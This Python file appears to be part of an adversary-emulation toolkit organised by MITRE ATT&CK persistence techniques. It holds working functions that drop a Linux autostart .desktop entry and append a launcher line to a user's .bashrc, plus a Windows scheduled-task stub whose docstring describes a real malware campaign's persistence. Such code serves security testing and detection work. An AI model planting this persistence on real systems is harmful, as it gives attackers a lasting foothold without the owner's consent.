import os

"""
Persistence
The adversary is trying to maintain their foothold.
https://attack.mitre.org/tactics/TA0003/
"""



def drop_config_autostart(platform, username):
    """
    T1547.013 Linux persistence with .config/autostart
    Platform: Linux
    """
    # copying the .desktop file to /etc/xdg/autostart or ~/.config/autostart
    # will make sure that the file is executed after boot( Att&ck ID: T1547.013)
    if platform == 'Linux':
        # Define the path to the autostart directory
        autostart_path = f"/home/{username}/.config/autostart"
        # Ensure the autostart directory exists
        os.makedirs(autostart_path, exist_ok=True)
        # Create a .desktop file in the autostart directory
        desktop_file = f"{autostart_path}/malicious_program.desktop"
        with open(desktop_file, "w") as f:
            f.write("[Desktop Entry]\n")
            f.write("Type=Application\n")
            f.write("Exec=/path/to/malicious_program\n")
            f.write("Hidden=false\n")
            f.write("NoDisplay=false\n")
            f.write("X-GNOME-Autostart-enabled=true\n")
        print(f"Info: T1547.013 Malicious .desktop file created at: {desktop_file}")


def drop_profile_modification(platform, username):
    """
    T1546.004 Unix Shell Configuration Modification
    Platform: Linux
    """
    # After execution, Rota Jakiro establishes persistence using two auto-run files:
    #a desktop environment file (.desktop) and a shell profile configuration file (.profile)

    if platform == 'Linux':
        # Define the path to the shell configuration file
        shell_config_file = f"/home/{username}/.bashrc"
        # Payload to be added to the shell configuration file
        payload = "\n# Malicious payload added for persistence\n/path/to/malicious_program &\n"
        # Check if the payload is already present in the file
        if os.path.exists(shell_config_file):
            with open(shell_config_file, "r") as f:
                if payload in f.read():
                    print("Info: T1546.004 Payload already present in the shell configuration file.")
                else:
                    with open(shell_config_file, "a") as f:
                        f.write(payload)
                    print("Info: T1546.004 Payload added to the shell configuration file for persistence.")
            print(f"Info: T1546.004 Shell configuration file modified: {shell_config_file}")
        else:
            print("Warning: T1546.004 .bashrc file not found in the home")


def drop_schtask_autostart(platform):
    """
    T1053.005 TBD windows persistence with schtask
    On Windows, persistence is achieved most of the time via a VBScript Encoded (VBE) file, which is an encoded VBScript file,
    written to %APPDATA%/Pythonenv/pythenenv.vbe.  Figure 6 shows cmd.exe hiding the directory %APPDATA%/Pythonenv,
    running pythenenv.vbe, and then scheduling the VBE file to be run every five minutes under the task MicrosoftWinRaRUtilityTaskB.
    """

    if platform == "Windows":

        # Under construction
        pass
